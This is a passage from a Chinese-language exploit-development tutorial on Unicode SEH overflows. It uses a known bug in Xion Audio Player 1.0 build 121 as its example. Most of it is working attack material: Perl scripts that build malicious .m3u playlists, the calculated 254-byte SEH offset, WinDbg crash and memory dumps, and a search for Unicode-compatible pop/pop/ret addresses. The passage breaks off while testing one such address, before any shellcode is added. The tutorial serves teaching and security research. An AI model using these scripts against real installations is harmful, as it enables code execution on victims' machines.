0012f2bc 0500140011 add eax,offset XXXX+0x1400 (11001400)
0012f2c1 006e00 add byte ptr [esi],ch
0012f2c4 2d00110011 sub eax,offset XXXX+0x1100 (11001100)
0012f2c9 006e00 add byte ptr [esi],ch
Cool，我们成功了！
现在我们这些放在一块以编写出可行的exploit出来：
● 在eip放置一些有利用价值的地址；
● 根据需要调整寄存器；
● 跳转 & 运行shellcode（ASCII 或 通过decoder）。
编写unicode exploit – Example 1
为了演示如何编写出可用的unicode-compatible exploit，这里将引用由DragOn Rider在2009.10.8发现的漏洞软
件Xion Audio Player v1.0(build 121)为例（http://securityreason.com/exploitalert/7392 ）。由于上面PoC代码中的
链接已不再指向build 121下载地址了，因此我这里提供一下漏洞软件的副本以供下载：
Xion Audio Player 1.0 build 121 (2.7 MB, 151 downloads)：http://www.corelan.be:8800/?dl_id=42
如果你想尝试新版本是否有漏洞，当然也是可以的，你可以在这里下载到：
http://www.r2.com.au/downloads/files/beta/qa-xion_v1.0b124.exe （感谢dellnull提供）
这份 PoC 代码是由 DragOn Rider 编写的，用于构造一个 playlist file(.m3u)，可引发程序崩溃。我的测试环境
（Windows XP SP3 English，全补丁）运行在VirtualBox，区域设置为English（US）（感谢Edi指正该exploit
只适用于此区域设置）。该PoC代码如下：
my $crash = "\x41" x 5000;
open(myfile,'>DragonR.m3u');
print myfile $crash;
打开程序（在 windbg 或其它调试器中打开），在界面上右击，选择”playlist”，然后“File”-“Load Playlist”，
最后选择m3u文件，看看效果：
(e54.a28): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000041 ebx=019ca7ec ecx=02db3e60 edx=00130000 esi=019ca7d0 edi=0012f298
eip=01aec2a6 esp=0012e84c ebp=0012f2b8 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210206
DefaultPlaylist!XionPluginCreate+0x18776:
01aec2a6 668902 mov word ptr [edx],ax ds:0023:00130000=6341
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
0:000> !exchain
image00400000+10041 (00410041)
Invalid exception stack at 00410041
SEH结构现在被覆盖为00410041(AA转换为unicode后的结果)。
在ASCII的情况下的SEH覆写，需要用pop pop ret地址覆盖SEH Handler，而short jump地址覆盖next SEH。
为此，我们需要完成以下三步：
● 找出SEH结构的偏移量；
● 找出兼容unicode的pop pop ret地址；
● 找出可用于跳转的地址。
第一步：偏移量。使用由Metasploit pattern_create生成的5000字符代替$crash变量中的5000 A’s，结果如下：
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0000006e ebx=02e45e6c ecx=02db7708 edx=00130000 esi=02e45e50 edi=0012f298
eip=01aec2a6 esp=0012e84c ebp=0012f2b8 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210202
DefaultPlaylist!XionPluginCreate+0x18776:
01aec2a6 668902 mov word ptr [edx],ax ds:0023:00130000=6341
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
0:000> !exchain
0012f2ac: BASS_FX+69 (00350069)
Invalid exception stack at 00410034
0:000> d 0012f2ac
0012f2ac 34 00 41 00 69 00 35 00-41 00 69 00 36 00 41 00 4.A.i.5.A.i.6.A.
0012f2bc 69 00 37 00 41 00 69 00-38 00 41 00 69 00 39 00 i.7.A.i.8.A.i.9.
0012f2cc 41 00 6a 00 30 00 41 00-6a 00 31 00 41 00 6a 00 A.j.0.A.j.1.A.j.
0012f2dc 32 00 41 00 6a 00 33 00-41 00 6a 00 34 00 41 00 2.A.j.3.A.j.4.A.
0012f2ec 6a 00 35 00 41 00 6a 00-36 00 41 00 6a 00 37 00 j.5.A.j.6.A.j.7.
0012f2fc 41 00 6a 00 38 00 41 00-6a 00 39 00 41 00 6b 00 A.j.8.A.j.9.A.k.
0012f30c 30 00 41 00 6b 00 31 00-41 00 6b 00 32 00 41 00 0.A.k.1.A.k.2.A.
0012f31c 6b 00 33 00 41 00 6b 00-34 00 41 00 6b 00 35 00 k.3.A.k.4.A.k.5.
用d 0012f2ac命令查看SEH结构，可以看到next SEH（红色部分）被覆盖为34 00 41 00，而SEH Handler（黄
色部分）被覆盖为69 00 35 00。为了计算出偏移量，我们需要使用next SEH和SEH Handler中的4字节内容，
可使用下列字符串来获得偏移量：34 41 69 35 -> 0x35694134：
xxxx@bt4 ~/framework3/tools
$ ./pattern_offset.rb 0x35694134 5000
254
那么此时脚本应该这样构造：
● 在254个字节之后覆盖SEH结构；
● 用00420042覆盖next SEH（正如你所见到的，只需2字节）；
● 用00430043覆盖SEH Handler（正如你所见到的，只需2字节）；
● 填充一些垃圾字节。
代码如下：
my $totalsize=5000;
my $junk = "A" x 254;
my $nseh="BB";
my $seh="CC";
my $morestuff="D" x (5000-length($junk.$nseh.$seh));
$payload=$junk.$nseh.$seh.$morestuff;
open(myfile,'>corelantest.m3u');
print myfile $payload;
close(myfile);
print "Wrote ".length($payload)." bytes\n";
结果：
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000044 ebx=019c4e54 ecx=02db3710 edx=00130000 esi=019c4e38 edi=0012f298
eip=01aec2a6 esp=0012e84c ebp=0012f2b8 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210206
DefaultPlaylist!XionPluginCreate+0x18776:
01aec2a6 668902 mov word ptr [edx],ax ds:0023:00130000=6341
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
0:000> !exchain
0012f2ac:
image00400000+30043 (00430043)
Invalid exception stack at 00420042
0:000> d 0012f2ac
0012f2ac 42 00 42 00 43 00 43 00-44 00 44 00 44 00 44 00 B.B.C.C.D.D.D.D.
0012f2bc 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f2cc 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f2dc 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f2ec 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f2fc 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f30c 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
0012f31c 44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00 D.D.D.D.D.D.D.D.
=>SEH结构已经被覆盖了，而在SEH结构之后的正是$morestuff变量中的D’s。
下一步就是找到一个pop pop ret地址。我们需要的是一个可执行的pop pop ret，即使第一和第三字节是null也
没有关系。我写的ImmDbg插件pvefindaddr可帮你解决此问题。用ImmDbg加载xion.exe，然后运行，打开playlist
对话框，选择”File”，”Load Playlist”，但先别加载播放文件。返回到调试器，运行!pvefindaddr p2。它将会搜
索整个进程内存空间中相匹配的 pop/pop/ret 地址，并将结果输出到 ppr2.txt 文件中，这一过程可能需要较长时
间，请耐心等待。
搜索完成后，打开上面的文本文件，搜索“Unicode”，或运行以下命令：
C:\Program Files\Immunity Inc\Immunity Debugger>type ppr2.txt | findstr Unicode
ret at 0x00470BB5 [xion.exe] ** Maybe Unicode compatible **
ret at 0x0047073F [xion.exe] ** Maybe Unicode compatible **
ret at 0x004107D2 [xion.exe] ** Maybe Unicode compatible **
ret at 0x004107FE [xion.exe] ** Maybe Unicode compatible **
ret at 0x00480A93 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00450015 [xion.exe] ** Unicode compatible **
ret at 0x0045048B [xion.exe] ** Maybe Unicode compatible **
ret at 0x0047080C [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470F41 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470F9C [xion.exe] ** Maybe Unicode compatible **
ret at 0x004800F5 [xion.exe] ** Unicode compatible **
ret at 0x004803FE [xion.exe] ** Maybe Unicode compatible **
ret 04 at 0x00480C6F [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470907 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470C9A [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470CD9 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470D08 [xion.exe] ** Maybe Unicode compatible **
ret at 0x004309DA [xion.exe] ** Maybe Unicode compatible **
ret at 0x00430ABB [xion.exe] ** Maybe Unicode compatible **
ret at 0x00480C26 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00450AFE [xion.exe] ** Maybe Unicode compatible **
ret at 0x00450E49 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470136 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470201 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470225 [xion.exe] ** Maybe Unicode compatible **
ret at 0x004704E3 [xion.exe] ** Maybe Unicode compatible **
ret at 0x0047060A [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470719 [xion.exe] ** Maybe Unicode compatible **
ret at 0x004707A4 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470854 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470C77 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470E09 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470E3B [xion.exe] ** Maybe Unicode compatible **
ret at 0x00480224 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00480258 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00480378 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00480475 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470EFD [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470F04 [xion.exe] ** Maybe Unicode compatible **
ret at 0x00470F0B [xion.exe] ** Maybe Unicode compatible **
ret at 0x00450B2D [xion.exe] ** Maybe Unicode compatible **
ret at 0x00480833 [xion.exe] ** Maybe Unicode compatible **
ret 04 at 0x00410068 [xion.exe] ** Unicode compatible **
ret 04 at 0x00410079 [xion.exe] ** Unicode compatible **
ret 04 at 0x004400C0 [xion.exe] ** Unicode compatible **
ret at 0x00470166 [xion.exe] ** Maybe Unicode compatible **
最应该引起注意的是Unicode compatible这类地址。对于第1和第3字节为null字节的地址，pvefindaddr脚本
会给出标示。你现在的首要任务是找出与exploit相匹配的地址，根据所使用的unicode code page，可能或不可
能使用包含>7f字节的地址。如上所示，这些地址均被限制在xion.exe进程内存空间之中，它刚好未经safeseh
编译。如果你忽略所有>7f字节的地址，最后可以得到以下地址：
0x00450015, 0x00410068, 0x00410079
下面测试一下这3个地址，看看会发生什么。
用其中一个地址覆盖SE Handler，再用2 A’s(0x41 0x41)覆盖next SEH，代码如下：
my $totalsize=5000;
my $junk = "A" x 254;
my $nseh="\x41\x41"; #nseh -> 00410041
my $seh="\x15\x45"; #put 00450015 in SE Handler
my $morestuff="D" x (5000-length($junk.$nseh.$seh));
$payload=$junk.$nseh.$seh.$morestuff;
open(myfile,'>corelantest.m3u');
print myfile $payload;
close(myfile);
print "Wrote ".length($payload)." bytes\n";
结果如下：
0:000> !exchain
0012f2ac:
image00400000+50015 (00450015)
Invalid exception stack at 00410041
在0x450015下断，然后按F5运行，再单步执行程序：
0:000> bp 00450015
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000
eip=00450015 esp=0012e47c ebp=0012e49c iopl=0 nv up ei pl zr na pe nc